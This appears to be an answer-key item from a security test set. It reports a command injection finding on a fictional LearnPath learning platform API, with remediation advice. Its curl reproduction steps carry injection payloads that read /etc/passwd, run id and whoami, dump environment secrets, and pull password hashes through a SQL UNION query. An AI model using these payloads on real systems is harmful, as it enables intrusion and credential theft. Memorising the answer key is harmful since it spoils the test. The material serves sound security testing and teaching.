# Expected Response

## System
- System: LearnPath Assessment Platform v1.8.0
- Domain: EDUCATION / EDTECH LMS
- Example ID: INJ-0116
- Risk ID: RISK-INJ-116
- Vulnerability: Command Injection (CMDi)

## Findings

### 1. Command Injection on `/api/v3/records?username=` (HAR Primary)

The `username` parameter is passed to a backend process that performs OS-level execution (Section 2.0: "OS-level execution — primary data store"). The payload `; cat /etc/passwd` uses shell separator `;` to inject an arbitrary OS command after the expected command. The HAR response returns SQL-shaped user data, indicating a dual code path (SQL lookup and/or OS command execution).

**Note on internal inconsistency:** The code snippet (Section 3.0) shows raw SQL string concatenation (`SELECT * FROM records WHERE username = '...'`) which conflicts with the declared "OS-level execution" backend. The HAR payload is a CMDi shell separator payload (`; cat /etc/passwd`) and the declared vulnerability is Command Injection. Primary demonstration uses CMDi (declared); SQL path noted as secondary.

**Evidence from HAR:**
- Endpoint: `GET /api/v3/records?username=; cat /etc/passwd`
- Payload: shell separator `;` followed by `cat /etc/passwd`
- Response: HTTP 200 with user records including admin `password_hash` (SQL path response)

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s "https://api.learnpath-asses.example.com/api/v3/records?username=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected:** Returns matching records only.

**Step 2 — CMDi: OS command injection via shell separator (primary HAR attack):**
```bash
curl -s "https://api.learnpath-asses.example.com/api/v3/records?username=;%20cat%20/etc/passwd" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** `/etc/passwd` contents returned (CMDi) or SQL user records (SQL path) — either confirms unvalidated shell operator injection.

**Step 3 — CMDi: identity enumeration:**
```bash
curl -s "https://api.learnpath-asses.example.com/api/v3/records?username=;%20id%3B%20whoami" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** Running user identity (UID, GID) and username returned — confirms OS-level code execution.

**Step 4 — CMDi: environment variable dump (credential exfiltration):**
```bash
curl -s "https://api.learnpath-asses.example.com/api/v3/records?username=;%20env" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** Application environment variables returned — database credentials, JWT secrets, API keys exposed. In EdTech LMS: student PII database credentials, LMS admin API keys.

**Step 5 — SQLi path: data exfiltration via UNION (db_owner, from code snippet):**
```bash
curl -s "https://api.learnpath-asses.example.com/api/v3/records?username=' UNION SELECT username,password_hash,role FROM users--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All user credentials returned including `role: "ADMIN"` — as observed in HAR response.

**Step 6 — Verbose error confirmation:**
```bash
curl -s "https://api.learnpath-asses.example.com/api/v3/records?username='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected verbose error:** SQL/shell error leaking table name `records`, column names, or server version.

## Secure Outcome
```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation
- **CMDi fix (RISK-INJ-116):** Never pass user-supplied input directly to OS command execution. Use allowlisted values only. If OS commands must be parameterized, use language-level safe APIs (`child_process.execFile` with argument array in Node.js) instead of `exec` with string interpolation.
- **SQLi fix:** Replace raw string concatenation with parameterized queries throughout `/api/v3/records`.
- **Restrict DB account:** Application must not run as `db_owner`.
- **Restrict OS process user:** Application process must not run as root or privileged system user.
- **Deploy input validation middleware:** Reject shell metacharacters (`;`, `|`, `&`, `` ` ``, `$`, `(`, `)`) in query parameters.
- **Disable verbose error messages in production.**
